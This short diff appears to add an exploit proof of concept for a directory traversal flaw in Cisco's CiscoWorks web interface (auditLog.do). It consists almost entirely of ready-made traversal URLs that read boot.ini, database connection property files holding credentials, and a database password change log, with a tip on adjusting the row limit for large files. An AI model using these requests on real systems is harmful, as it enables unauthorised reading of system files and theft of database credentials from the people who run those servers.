@@ -1,0 +1,14 @@
+http://www.example.com/cwhp/auditLog.do?file=..\..\..\..\..\..\..\boot.ini
+cmfDBA user database info:
+
+http://www.example.com/cwhp/auditLog.do?file=..\..\..\..\..\..\..\Program
+Files\CSCOpx\MDC\Tomcat\webapps\triveni\WEB-INF\classes\schedule.properties DB connection info for all databases:
+
+http://www.example.com/cwhp/auditLog.do?file=..\..\..\..\..\..\..\Program
+Files\CSCOpx\lib\classpath\com\cisco\nm\cmf\dbservice2\DBServer.properties
+
+Note: When reading large files such as this file, ensure the row limit is adjusted to 500 for example.
+DB password change log:
+
+http://www.example.com/cwhp/auditLog.do?file=..\..\..\..\..\..\..\Program
+Files\CSCOpx\log\dbpwdChange.log
